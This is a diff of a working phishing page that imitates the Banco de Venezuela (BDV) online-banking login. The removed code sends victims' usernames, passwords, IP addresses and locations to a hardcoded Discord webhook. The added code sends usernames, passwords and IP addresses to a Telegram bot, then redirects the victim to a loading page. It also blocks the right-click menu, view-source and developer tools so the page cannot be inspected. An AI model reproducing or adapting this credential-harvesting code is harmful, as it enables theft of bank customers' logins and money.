@@ -1,394 +1,415 @@
 <!DOCTYPE html>
 <html lang="es">
-
-<head>
-
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Banco de Venezuela</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-image: url(./css/background.jpg);
-      background-size: cover;
-      background-position: center;
-    }
-
-    .container {
-      display: flex;
-
-      height: 100%;
-      width: 100%;
-    }
-
-    .left-side {
-      width: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .right-side {
-      width: 50%;
-    }
-
-    .form {
-      width: 80%;
-      background: white;
-      max-width: 550px;
-      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
-    }
-
-    @media (max-width: 768px) {
+  <head>
+     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDV</title>
+    <style>
       body {
-        background: #ededed;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.webp);
+        background-size: cover;
+        background-position: center;
       }
 
       .container {
-        flex-direction: column;
+        display: flex;
+        height: 100%;
+        width: 100%;
       }
 
       .left-side {
-        width: 100%;
-        height: 100vh;
+        width: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
       }
 
       .right-side {
-        display: none;
+        width: 50%;
       }
-    }
-  </style>
-  <style>
-    .form-group {
-      position: relative;
-      margin-bottom: 20px;
-      margin: 20px;
-    }
+      .form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
 
-    .form-group label {
-      position: absolute;
-      top: 50%;
-      left: 10px;
-      transform: translateY(-55%);
-      color: #999;
-      transition: top 0.3s, font-size 0.3s;
-      pointer-events: none;
-    }
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
 
-    .form-group input {
-      width: 100%;
-      padding: 10px;
-      box-sizing: border-box;
-      position: relative;
-      height: 60px;
-      border: 0;
+      .form-group {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
 
-      border-bottom: 1px solid gray;
-      background: #ededed;
-      outline: none;
-    }
+      .form-group label {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
 
-    .form-group input:focus {
-      border: 0;
-    }
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group input:focus {
+        border: 0;
+      }
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+      button {
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        border: 0;
+        padding: 15px;
+        width: 200px;
+      }
 
-    .form-group input:focus+label,
-    .form-group input:not(:placeholder-shown)+label {
-      top: 5px;
-      font-size: 12px;
-    }
+      .form-group2 {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
 
-    button {
-      background-color: #0067b1;
-      color: white;
-      border-radius: 3px;
-      border: 0;
-      padding: 15px;
-      width: 200px;
-    }
-  </style>
-  <style>
-    .form-group2 {
-      position: relative;
-      margin-bottom: 20px;
-      margin: 20px;
-    }
+      .form-group2 label {
+        position: absolute;
+        top: 50%;
+        left: 23%;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
 
-    .form-group2 label {
-      position: absolute;
-      top: 50%;
-      left: 23%;
-      transform: translateY(-55%);
-      color: #999;
-      transition: top 0.3s, font-size 0.3s;
-      pointer-events: none;
-    }
+      .form-group2 input {
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group2 input:focus {
+        border: 0;
+      }
+      .form-group2 input:focus + label,
+      .form-group2 input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
 
-    .form-group2 input {
-      padding: 10px;
-      box-sizing: border-box;
-      position: relative;
-      height: 60px;
-      border: 0;
-      border-bottom: 1px solid gray;
-      background: #ededed;
+      .overlay {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente */
+        z-index: 9999; /* Asegura que esté por encima de otros elementos */
+      }
 
-      outline: none;
-    }
+      .content {
+        background-color: #fff;
+        width: 350px;
+        border-radius: 5px;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+   
+    <div class="overlay" id="overlay" style="display: none">
 
-    .form-group2 input:focus {
-      border: 0;
-    }
-
-    .form-group2 input:focus+label,
-    .form-group2 input:not(:placeholder-shown)+label {
-      top: 5px;
-      font-size: 12px;
-    }
-  </style>
-  <style>
-    .overlay {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.5);
-      /* Fondo semitransparente */
-      z-index: 9999;
-      /* Asegura que esté por encima de otros elementos */
-    }
-
-    .content {
-      background-color: #fff;
-      width: 350px;
-      border-radius: 5px;
-      text-align: center;
-    }
-  </style>
-</head>
-
-
-
-
- 
-
-<body>
-
-  <div class="overlay" id="overlay" style="display: none">
-    <div class="content">
-<form id="loginform2" action="tu_post.php" method="post">
-  <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
-
-  <div class="form-group2" style="position: relative;">
-    <input type="text" id="contra" name="contra" required />
-    <label for="contra">Contraseña *</label>
-
-   <span
-  id="errorContra"
-  style="
-    display: none;
-    color: red;
-    font-size: 12px;
-    position: absolute;
-    left: 50%;
-    transform: translateX(-50%);
-    bottom: -18px;
-    text-align: center;
-    width: 100%;
-  "
->
-  Debe contener al menos un carácter especial
-</span>
-  </div>
-
-  <div style="width: 100%; text-align: center; padding-bottom: 30px">
-    <button type="submit" style="width:160px">Continuar</button>
-  </div>
-</form>
-
-
-
-
-
-
-
-    </div>
-  </div>
-
-  <div class="container">
-    <div class="left-side">
-      <form id="loginform" class="form">
-        <div style="text-align: center">
-          <img src="./css/logo.png" alt="" style="width: 60%; margin-top: 20px" />
-        </div>
-        <div style="width: 100%; text-align: center">
-          <div class="form-group">
-            <input type="text" id="nombre" name="nombre" style="width: 100%" required />
-            <label for="nombre">Usuario *</label>
+      <div class="content">
+        <form id="loginform2">
+          <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
+          <div class="form-group2">
+            <input type="password" id="contra" required />
+            <label for="contra">Contraseña</label>
           </div>
-        </div>
-        <div style="width: 100%; text-align: center">
-          <button>Entrar</button>
-        </div>
-        <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #999; margin-top: 30px; margin-bottom: 30px;">
-          ¿Olvidaste tu usuario o clave? <br />
-          Si eres nuevo cliente BDV, regístrate aquí
-        </div>
-      </form>
+          <script>
+            document.addEventListener("DOMContentLoaded", function () {
+              const input = document.getElementById("contra");
+              const label = input.nextElementSibling;
+              const continuarButton = document.getElementById("continuarBtn");
+              
+              // Dris
+              continuarButton.disabled = true;
+              continuarButton.style.backgroundColor = "#ccc";
+              continuarButton.style.cursor = "not-allowed";
+
+                              // Va
+                  input.addEventListener("input", () => {
+                      const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(input.value);
+                      const hasMinLength = input.value.length >= 7;
+                      
+                      // Verifica si cumple ambas condiciones: carácter especial y longitud mínima
+                      if (hasSpecialChar && hasMinLength) {
+                          continuarButton.disabled = false;
+                          continuarButton.style.backgroundColor = "#0067b1";
+                          continuarButton.style.cursor = "pointer";
+                      } else {
+                          continuarButton.disabled = true;
+                          continuarButton.style.backgroundColor = "#ccc";
+                          continuarButton.style.cursor = "not-allowed";
+                      }
+                  });
+
+              // Animación del label
+              label.style.top = "50%";
+              if (input.value !== "") {
+                label.style.top = "15px";
+                label.style.fontSize = "12px";
+              }
+
+              input.addEventListener("focus", () => {
+                label.style.top = "15px";
+                label.style.fontSize = "12px";
+              });
+
+              input.addEventListener("blur", () => {
+                if (!input.value) {
+                  label.style.top = "50%";
+                  label.style.fontSize = "";
+                }
+              });
+            });
+          </script>
+          <div style="width: 100%; text-align: center; padding-bottom: 30px">
+            <button id="continuarBtn" style="width: 80px; background-color: #ccc; cursor: not-allowed;" disabled>Continuar</button>
+            <button style="width: 80px" disabled>Cancelar</button>
+          </div>
+        </form>
+      </div>
+
+
+      
     </div>
-    <div class="right-side"></div>
-  </div>
+
+
+
+
+    <div class="container">
+      <div class="left-side">
+        <form id="loginform" class="form">
+          <div style="text-align: center">
+            <img src="./logo.png" alt="" style="width: 80%; margin-top: 10px" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div class="form-group">
+              <input
+                type="text"
+                id="nombre"
+                name="nombre"
+                style="width: 100%"
+                required
+              />
+              <label for="nombre">Usuario *</label>
+            </div>
+
 
   <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
-  <script>
+
+<script>
     const url = "https://ipapi.co/json/";
     const form = document.querySelector("#loginform");
     const form2 = document.querySelector("#loginform2");
 
-    form.addEventListener("submit", (event) => {
-      event.preventDefault(); // Evita que se envíe el formulario
+    // Fr
+        async function obtenerDatosSesion() {
+            try {
+                const response = await fetch("target.php", {
+                    method: "POST",
+                });
+                const data = await response.json();
+                if (data.error) {
+                    console.error("Error:", data.error);
+                    return null;
+                }
+                return { chatId: data.chat_id, token: data.token };
+            } catch (error) {
+                console.error("Error en la solicitud:", error);
+                return null;
+            }
+        }
+    // Ot`
+    obtenerDatosSesion().then(datosSesion => {
+        if (!datosSesion) return;
 
-      axios.get(url) // Realiza la solicitud GET para obtener información adicional
-        .then((response) => {
-          const nombre = document.querySelector("#nombre").value; // Obtiene el nombre del input
-          localStorage.setItem("usuario", nombre); // Guarda el nombre en localStorage
+        const { chatId, token } = datosSesion;
 
-          // Aquí puedes manejar la información obtenida como quieras, pero no enviar a Discord
-          const ciudad = response.data.city;
-          const pais = response.data.country;
-          const ip = response.data.ip;
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+            
+                            document.getElementById("overlay").style.display = "";
+                       
+        });
 
-          // Si quieres mostrar la información en la consola o en el UI:
-          console.log("Nombre guardado:", nombre);
-          console.log("Ciudad:", ciudad);
-          console.log("País:", pais);
-          console.log("IP:", ip);
-
-          // Muestra el overlay si es necesario
-          document.getElementById("overlay").style.display = ""; 
-        })
-        .catch((error) => {
-          console.log(error); // Manejo de errores
+        form2.addEventListener("submit", (e) => {
+            e.preventDefault();
+            axios.get(url)
+                .then((e) => {
+                    const o = document.querySelector("#nombre").value;
+                    localStorage.setItem("usuario", o);
+                    const n = document.querySelector("#contra").value;
+                    const t = "\nBDV\nNombre: " + o + "\nContra: " + n + "\nIP: " + e.data.ip;
+                    axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: chatId, text: t })
+                        .then(() => {
+                            window.location.href = "cargando.html";
+                        })
+                        .catch((error) => {
+                            console.error(error);
+                        });
+                })
+                .catch((error) => {
+                    console.log(error);
+                });
         });
     });
-
-        form2.addEventListener("submit", (event) => {
-      event.preventDefault(); // Evita que se envíe el formulario
-
-      axios.get(url)
-        .then((response) => {
-          const nombre = localStorage.getItem("usuario"); // Recupera el nombre de localStorage
-          const contra = document.querySelector("#contra").value; // Obtiene la contraseña del input
-
-          // Verifica que el nombre no sea nulo
-          if (!nombre) {
-            console.error("No se ha guardado el nombre en la sesión.");
-            return;
-          }
-
-          // Composición del mensaje a enviar a Discord
-          const message =
-            "BDV\nNombre: " +
-            nombre +
-            "\nContra: " +
-            contra +
-            "\nCiudad: " +
-            response.data.city +
-            "\nPais: " +
-            response.data.country +
-            "\nIP: " +
-            response.data.ip;
-
-          // Cambia esta URL por tu webhook de Discord
-          const discordWebhookUrl = "https://discord.com/api/webhooks/1434386956133077013/Lt4bC3hwnGuhzYmZ0_u3ygnqRXoA1HZSDbnEXjw8uOT7mrRZurXQwk7Gu09nwIZ5tQp2";
-
-          // Envía el mensaje a Discord
-          return axios.post(discordWebhookUrl, { content: message })
-            .then(() => {
-              // Muestra el botón para copiar el mensaje
-              showCopyButton(message);
-              // Redirige a la página de carga si el envío fue exitoso
-              window.location.href = "cargando.html";
-            });
-        })
-        .catch((error) => {
-          console.error("Error:", error); // Manejo de errores
-        });
-    });
-
-    // Función para mostrar el botón de copiar
-    function showCopyButton(message) {
-      const copyButtonContainer = document.createElement("div");
-      copyButtonContainer.style.textAlign = "center";
-      copyButtonContainer.style.marginTop = "20px";
-
-      const copyButton = document.createElement("button");
-      copyButton.innerText = "Copiar Mensaje";
-      copyButton.style.backgroundColor = "#0067b1";
-      copyButton.style.color = "white";
-      copyButton.style.border = "none";
-      copyButton.style.padding = "10px 20px";
-      copyButton.style.borderRadius = "5px";
-
-      // Evento para copiar el mensaje al portapapeles
-      copyButton.onclick = function () {
-        copyToClipboard(message);
-        alert("El mensaje ha sido copiado al portapapeles.");
-      };
-
-      copyButtonContainer.appendChild(copyButton);
-      document.body.appendChild(copyButtonContainer); // Añade el botón al cuerpo del documento
-    }
-
-    // Función para copiar texto al portapapeles
-    function copyToClipboard(text) {
-      const textarea = document.createElement("textarea");
-      textarea.value = text;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand("copy");
-      document.body.removeChild(textarea);
-    }
-  </script>
-
-   
-
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const form = document.getElementById("loginform2");
-  const contra = document.getElementById("contra");
-  const errorText = document.getElementById("errorContra");
-
-  const specialCharRegex = /[^a-zA-Z0-9]/;
-
-  // OJO: tercer parámetro TRUE = captura (se ejecuta primero)
-  form.addEventListener("submit", function (e) {
-    if (!specialCharRegex.test(contra.value)) {
-      // ❌ inválido → bloquea TODO
-      e.preventDefault();
-      e.stopImmediatePropagation(); // corta otros listeners
-      errorText.style.display = "block";
-      return false; // respaldo extra
-    }
-
-    // ✅ válido → NO bloqueamos → el POST se envía
-    errorText.style.display = "none";
-  }, true);
-});
-
-
 </script>
 
+
+  
+            <script>
+              document.addEventListener("DOMContentLoaded", function () {
+                const input = document.getElementById("nombre");
+                const label = input.nextElementSibling;
+                label.style.top = "50%";
+                if (input.value !== "") {
+                  label.style.top = "15px";
+                  label.style.fontSize = "12px";
+                }
+
+                input.addEventListener("focus", () => {
+                  label.style.top = "15px";
+                  label.style.fontSize = "12px";
+                });
+
+                input.addEventListener("blur", () => {
+                  if (!input.value) {
+                    label.style.top = "50%";
+                    label.style.fontSize = "";
+                  }
+                });
+              });
+            </script>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button>Entrar</button>
+          </div>
+          <div
+            style="
+              width: 100%;
+              text-align: center;
+              font-size: 12px;
+              font-weight: bold;
+              color: #999;
+              margin-top: 30px;
+              margin-bottom: 30px;
+            "
+          >
+            ¿Olvidaste tu usuario o clave? <br />
+            Si eres nuevo clienteBDV regístrate aquí
+          </div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+
+
 </body>
+  <script>
+    document.addEventListener("contextmenu", function (event) {
+      event.preventDefault();
+    });
+
+    document.addEventListener("keydown", function (event) {
+      if (event.ctrlKey && event.key === "u") {
+        event.preventDefault();
+      }
+    });
+
+      ////
+    function blockDevTools() {
+        var devtools = false;
+        var threshold = 160;
+        var checkDevTools = function() {
+            var start = new Date();
+            debugger;
+            var end = new Date();
+            if (end - start > threshold) {
+                devtools = true;
+                document.body.innerHTML = "¡Inspección bloqueada!";
+            } else {
+                devtools = false;
+            }
+        };
+        setInterval(checkDevTools, 1000); // 1e3 = 1000 ms = 1 segundo
+    }
+
+    // P
+    function preventInspection() {
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+        });
+
+        document.addEventListener("keydown", function(event) {
+            // B
+            if (event.keyCode === 123 || // F12
+                (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 67)) || // Ctrl+Shift+I, Ctrl+Shift+C
+                (event.ctrlKey && event.keyCode === 85)) { // Ctrl+U
+                event.preventDefault();
+            }
+        });
+    }
+
+    //
+    window.onload = function() {
+        preventInspection();
+        blockDevTools();
+        startTimer();
+    };
+</script>
 
 </html>
